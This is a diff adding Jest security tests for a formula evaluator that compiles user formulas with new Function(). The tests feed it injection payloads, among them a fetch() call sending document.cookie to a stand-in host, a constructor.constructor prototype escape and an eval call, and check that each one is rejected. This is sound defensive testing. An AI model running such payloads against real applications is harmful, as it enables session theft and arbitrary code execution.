@@ -227,4 +227,76 @@ describe('calculatedColumns', () => {
 
     expect(rows).toEqual([{ Venta: 10, otra: 1, 'var venta': 10 }]);
   });
+
+  describe('security: rejects formulas with unrecognized identifiers (2026-09-29)', () => {
+    // FUNCTION_ALIAS_REGEX only translates known ALL-CAPS names (IF, OR, ...)
+    // and used to leave any other identifier untouched, so it reached
+    // `new Function()` with real access to browser globals (new Function()
+    // does not sandbox against the global scope, only its named parameters).
+    // The comma operator lets a formula "return" a harmless value while
+    // still executing an arbitrary side-effecting expression first.
+    const globalsBackup: Record<string, unknown> = {};
+    beforeEach(() => {
+      globalsBackup.fetch = (global as any).fetch;
+      globalsBackup.document = (global as any).document;
+      (global as any).fetch = jest.fn(() => Promise.resolve());
+      (global as any).document = { cookie: 'session=stolen' };
+    });
+    afterEach(() => {
+      (global as any).fetch = globalsBackup.fetch;
+      (global as any).document = globalsBackup.document;
+    });
+
+    it('blocks the comma-operator + fetch() exfiltration payload and never calls fetch', () => {
+      const evaluator = compileFormulaEvaluator(
+        "(1, fetch('https://evil.example/steal?c=' + document.cookie))",
+        ['Venta'],
+      );
+      expect(evaluator({ Venta: 1 })).toBeNull();
+      expect((global as any).fetch).not.toHaveBeenCalled();
+    });
+
+    it('blocks bare access to window/document', () => {
+      expect(
+        compileFormulaEvaluator('document.cookie.length', ['Venta'])({
+          Venta: 1,
+        }),
+      ).toBeNull();
+      expect(
+        compileFormulaEvaluator('window.location', ['Venta'])({ Venta: 1 }),
+      ).toBeNull();
+    });
+
+    it('blocks prototype-chain escapes via the row/total parameters (e.g. total.constructor.constructor(...))', () => {
+      const evaluator = compileFormulaEvaluator(
+        "total.constructor.constructor('return 1')()",
+        ['Venta'],
+      );
+      expect(evaluator({ Venta: 1 }, { total: { Venta: 1 } })).toBeNull();
+    });
+
+    it('blocks a direct eval(...) call', () => {
+      expect(
+        compileFormulaEvaluator("eval('1')", ['Venta'])({ Venta: 1 }),
+      ).toBeNull();
+    });
+
+    it('still compiles and evaluates legitimate formulas using only known helpers/columns', () => {
+      const evaluator = compileFormulaEvaluator(
+        'IF(OR(ISBLANK(total.{{Venta}}), total.{{Venta}} = 0), 0, {{Venta}} / total.{{Venta}})',
+        ['Venta'],
+      );
+      expect(evaluator({ Venta: 25 }, { total: { Venta: 100 } })).toBe(0.25);
+    });
+
+    it('does not flag identifiers that only appear inside string literals', () => {
+      // "hello"/"world" look like bare identifiers but are string contents,
+      // not code -- must not be rejected by the allowlist scan.
+      const evaluator = compileFormulaEvaluator(
+        "IF({{Venta}} = 'hello world', 1, {{Venta}})",
+        ['Venta'],
+      );
+      expect(evaluator({ Venta: 5 })).toBe(5);
+    });
+  });
 });
